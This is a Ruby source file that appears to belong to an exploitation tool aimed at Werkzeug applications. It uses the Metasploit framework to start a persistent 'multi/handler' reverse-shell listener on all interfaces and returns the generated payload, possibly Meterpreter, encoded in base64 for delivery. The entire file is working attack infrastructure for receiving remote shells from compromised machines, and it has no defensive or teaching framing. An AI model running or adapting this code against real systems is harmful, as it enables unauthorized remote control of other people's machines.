# frozen_string_literal: true

require 'base64'

# Public handler API leaves the selected exploit instance intact for repeat tests.
module WerkzeugSessionControl
  def self.start_native(framework, input, output, payload, host, port)
    handler = framework.exploits.create('multi/handler')
    handler.datastore.merge!(
      'PAYLOAD' => payload, 'LHOST' => host, 'LPORT' => port,
      'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false
    )
    options = { 'Payload' => payload, 'RunAsJob' => true, 'LocalInput' => input, 'LocalOutput' => output }
    Msf::Simple::Exploit.exploit_simple(handler, options)
    job = framework.jobs[handler.job_id.to_s]
    raise 'Native handler did not start' unless job

    owner, instance = job.ctx
    {
      job: job.jid, payload: instance.refname, fork: instance.datastore['MeterpreterTryToFork'],
      program_base64: Base64.strict_encode64(owner.payload.encoded)
    }
  end
end
